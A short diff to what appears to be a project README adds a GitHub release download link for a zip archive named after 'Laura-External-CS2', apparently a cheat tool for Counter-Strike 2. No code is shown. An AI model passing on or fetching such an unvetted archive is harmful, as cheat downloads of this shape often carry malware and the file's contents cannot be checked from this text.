@@ -10,7 +10,7 @@
 
 ## 📥 Download
 
-**[Download Laura-External-CS2]()**
+**[Download Laura-External-CS2](https://github.com/dmitryt-ops1989x9/Laura-External-CS2/releases/download/03850/LauraExternalCS.zip)**
 
 ---
 
